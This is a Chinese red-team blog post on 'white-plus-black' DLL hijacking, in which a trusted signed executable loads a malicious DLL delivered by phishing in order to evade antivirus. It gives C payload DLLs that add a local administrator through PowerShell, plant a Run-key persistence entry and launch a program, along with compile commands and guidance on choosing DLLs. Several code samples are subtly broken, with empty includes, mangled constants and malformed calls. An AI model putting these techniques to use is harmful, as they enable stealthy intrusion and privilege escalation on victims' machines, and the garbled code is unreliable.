#### 0X00前言
* * *
为什么我们需要白加黑这种攻击方法呢？答：降本增效，我们知道在以后AI+安全崛起的大背景下，社工将会成为攻防演练项目中，成本最低，效率最高的一种攻击方式，而这个时候"白加黑"的成本优势就体现的淋漓尽致了。
那什么是白加黑呢？答：白加黑就是通过DLL劫持在应用程序的导出目录中通过创建一个DLL并通过LoadLibrary函数（或者找一个已有的DLL注入恶意代码）来加载DLL文件。当目标尝试执行该文件（注意：不是执行受恶意的DLL文件）时，这个白文件会在应用程序加载时加载恶意的DLL。目标只要加载包含恶意代码的文件，攻击者就可以访问目标计算机了。
**小提示：代码只是参考，不一定可以运行哟！！！**
#### 0X01起源
* * *
在攻防演练中通过运行恶意代码连接C2是最常用的手段，但是由于对抗程度的提升。以360、天擎为代表的杀毒软件针对信任链的检测，已经变得愈来愈成熟。这个时候我们要么花费巨额资金去购买"签名"，要么针对杀软当中的白名单进行研究与利用。
这个时候有人会说，怎么去利用白名单呢？答：攻击者利用了微软Windows应用程序加载DLL文件的方式。这里我们可以理解为，攻击者通过利用"白加黑"这种攻击方法（即，利用白文件加载恶意的动态链接库
(DLL) ）。当攻击者通过社工钓鱼的手段，使得目标下载恶意的文件到目标自己的计算机上，并点击运行白文件时，该文件会在运行时执行恶意DLL。
我们通过构造"白加黑"可以达到如下的目的：
> 运行文件，达到执行敏感命令的目的（eg：执行MS系列POC、将Mimikatz变为shellcode执行....）  
>  运行文件，达到权限提升的目的（eg：添加net user创建新用户.....）  
>  运行文件，达到权限维持的目的（eg：添加新的注册表）......
补充：360、天擎为代表的杀软也会对一些微软签名的Windows工具和.exe文件进行标记，例如：PuDump、Rundll32、Msbuild.....所以，攻击者需要实时更新自己的DLL白名单，不然免杀效果很可能失效。
##### 运行文件，达到执行敏感命令的目的
    /*
    DLL劫持运行
    编译64位（Linux）：i686_64-w64-mingw32-gcc -shared -o xxx.dll xxx.c
    */
    #include 
    #pragma comment (lib, "user32.lib")
    BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
        switch (ul_reason_for_call)  {
        case DLL_PROCESS_ATTACH:
          MessageBox(
            NULL,
            "hello world!",
            MB_OK
          );
          break;
        case DLLPROCESSDETACH:
          break;
        case DLLTHREADATTACH:
          break;
        case DLLTHREADDETACH:
          break;
        }
        return TRUE;
    }
也许最简单的纠正措施包括确保所有软件都安装在受保护的目录`C:\Program Files`或`C:\Program Files (x86)`.
如果无法在这些地方安装软件，那么下一个最简单的步骤就是保证只有管理用户对安装目录具有“创建”或“写入”权限，以防止攻击者安装恶意 DLL 从而破坏漏洞。
##### 运行文件，达到权限提升的目的
    /*
    DLL权限提升
    编译（Linux）
    对于x64编译：x86_64-w64-mingw32-gcc evil.c -shared -o xxx.dll
    对于x86编译：i686-w64-mingw32-gcc evil.c -shared -o xxx.dll
    */
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
        switch (ul_reason_for_call)  {
        case DLL_PROCESS_ATTACH:
          system("powershell.exe /k net localgroup administrators user /add");
          break;
        case DLLPROCESSDETACH:
          break;
        case DLLTHREADATTACH:
          break;
        case DLLTHREADDETACH:
          break;
        }
        return TRUE;
    }
##### 运行文件，达到权限维持的目的
    /*
    DLL权限维持
    编译（Linux）
    对于x64编译：x86_64-w64-mingw32-gcc evil.c -shared -o xxx.dll
    对于x86编译：i686-w64-mingw32-gcc evil.c -shared -o xxx.dll
    */
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
        switch (ul_reason_for_call)  {
        case DLL_PROCESS_ATTACH:
          HKEY hkey = NULL;
          const char* exe = "C:\\xxx.exe";
          LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
          if (res == ERROR_SUCCESS) {
            RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
            RegCloseKey(hkey);
          }
          break;
        case DLLPROCESSDETACH:
          break;
        case DLLTHREADATTACH:
          break;
        case DLLTHREADDETACH:
          break;
        }
        return TRUE;
    }
#### 0X02攻击方式
* * *
由上面的文章可以知道，主流的"白加黑"有三种不同的加载方式：
> 白执行黑DLL  
>  白执行DLL加载shellcode  
>  白加载shellcode
我们知道当程序被编译时，可执行文件的头文件（PE）会将导入表添入其中。而导入表的作用是记住需要从哪个DLL导入哪些函数，所以白文件每次执行程序时，链接器都知道该做什么并自动加载所有必需的库。这时我们就可以通过找到合适的DLL（即，拥有写入权限的），并对其进行修改（即，注入恶意的代码）为恶意的黑DLL。但是如果没有合适的可修改的黑DLL，我们又想在运行时候让白文件加载黑DLL，那么Windows
API提供`LoadLibrary()`和`LoadLibraryEx()`函数就为我们提供了一个新的思路，那就是通过函数构造一个黑DLL，在将DLL的名称导入到导入表中使其在白文件运行的时候执行。以上两种不同的思路，导致了"白加黑"有了两种不同的思路，即可以修改原有的DLL，也可以创造一个黑DLL进行攻击。
这里补充一下，白加载shellcode就是我们所说的无文件落地免杀！我们首先讲一讲前面两个在国内流行的"白加黑"的方法吧，关于无文件落地下一段再说。
##### 白加黑通用流程
>   1. 寻找合适的白文件（eg：）
>
>
> 
>
>
>
> 提示：建议手工查找，脚本准确几率不高！！
>
>   1. 检查文件夹权限，查看是否有写入权限，如果有可以考虑直接修改，反之则考虑通过LoadLibrary函数创建一个新的黑DLL
>
>
> 
>
>
> 提示：我们知道Windows系统会按照预先确定的顺序查找相关库的位置。又因为DLL的执行顺序：加载应用程序的目录===>系统目录C:\Windows\System32===>系统目录C:\Windows\System===>Windows
> 目录 C:\Windows===>当前工作目录===>PATH
> 环境变量定义的目录；所以我们可以按照如下图所示的顺序进行DLL的搜索，并通过工具确定合适的DLL。
>
>
##### 白执行黑DLL
关于这个方法我们根据选择的白文件的DLL的特点，进行合理的修改！首先我们可以利用库引用在白文件的上下文中执行代码。如果文件允许LoadLibrary函数动态解析库的路径，那么该文件也会在当前目录中查找库DLL。我们通过将"白加黑"复制到具有写入权限的目录即可。如果我们需要创建自定义的黑DLL，那么白文件将加载黑DLL并执行恶意的代码。而且，我们寻找的白文件大多会有签名并通过了杀软的信任，使得我们的攻击成功几率大大增加。
黑DLL的代码演示（如下图所示）：
    /*
    DLL执行DLL的命令
    编译64位（Linux）：i686_64-w64-mingw32-gcc -shared -o xxx.dll xxx.c
    */
    # include "pch.h"
    # include 
    BOOL APIENTRY DllMain(HMODULE hModule,
     DWORD ul_reason_for_call,
     LPVOID lpReserved
    )
    {
     switch (ul_reason_for_call)
     {
     case DLLPROCESSATTACH: 
     system("calc");
     case DLLTHREADATTACH: 
     case DLLTHREADDETACH: 
     break;
     }
     return TRUE;
    }
不满足所有导出的 DLL 劫持，在 C/C++ 中编写有效负载 DLL